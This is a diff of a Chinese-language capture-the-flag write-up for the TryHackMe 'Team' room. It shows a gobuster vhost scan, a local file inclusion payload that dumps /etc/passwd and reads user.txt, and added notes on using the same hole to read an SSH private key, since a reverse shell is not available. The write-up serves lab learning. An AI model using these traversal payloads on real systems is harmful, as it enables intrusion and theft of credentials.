@@ -112,11 +112,9 @@ ftp>ascii
 Dale
         I have started coding a new website in PHP for the team to use, this is currently under development. It can be
 found at ".dev" within our domain.
-
 Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
-
 Gyles
-
+id_rsa放在配置文件里了
 
 VHOST扫描：
 ```
@@ -125,7 +123,8 @@ gobuster vhost -u http://team.thm/ -w deepmagic.com-prefixes-top50000.txt -k --a
 扫出来了dev.team.thn是200，加到hosts里，访问一下
 `http://dev.team.thm/`点一下页面的链接变为`http://dev.team.thm/script.php?page=teamshare.php`
 根据提示这个地方可以变为`http://dev.team.thm/script.php?page=../../../etc/passwd`(文件包含漏洞)，这个地方输出目标系统的/etc/passwd。
-    
+和前面的话相互印证
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -168,6 +167,12 @@ sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 ../../../../home/dale/user.txt
 ```
 但是root.txt不能直接读出来，还是要想办法拿到反shell
+
+拿不到反shell，因为文件包含只支持php://filter和本地文件包含，不能写一个恶意文件或是远程包含恶意文件
+根据前面的话可以知道，有机会读到id_rsa私钥:
+```
+?page=
+```
 
 
 
